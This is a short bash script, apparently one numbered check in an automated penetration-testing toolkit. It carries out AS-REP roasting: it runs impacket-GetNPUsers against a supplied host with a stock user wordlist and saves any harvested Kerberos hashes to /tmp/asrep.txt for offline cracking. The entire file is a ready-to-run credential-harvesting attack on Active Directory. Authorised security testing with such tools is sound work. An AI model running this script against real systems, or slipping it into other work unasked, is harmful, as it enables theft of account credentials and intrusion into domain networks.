#!/bin/bash
# V-095 -- AS-REP roasting
# Tool: impacket_GetNPUsers
# Usage: bash V-095.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-095.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"
HOST=$(echo "$TARGET" | sed -E 's|https?://||' | sed 's|/.*$||' | sed 's|:.*$||')

impacket-GetNPUsers "$HOST" -usersfile /usr/share/wordlists/metasploit/unix_users.txt -outputfile /tmp/asrep.txt 2>&1 | head -30
exit $?
